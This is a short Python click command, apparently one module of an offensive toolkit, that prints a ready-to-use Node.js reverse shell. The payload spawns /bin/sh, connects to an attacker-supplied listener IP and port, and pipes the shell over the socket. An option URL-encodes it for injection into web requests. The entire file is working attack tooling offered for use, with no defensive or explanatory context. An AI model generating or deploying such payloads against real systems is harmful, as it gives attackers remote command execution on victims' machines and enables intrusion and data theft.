import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
def command(listener_ip, listener_port, raw, urlencode):
    """Return Node.js reverse shell"""
    cmd = (f"(function(){{"
           f"var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);"
           f"var client=new net.Socket();"
           f"client.connect({listener_port},\"{listener_ip}\",function(){{"
           f"client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
           f"return /a/;}})();")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Node.js reverse shell:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
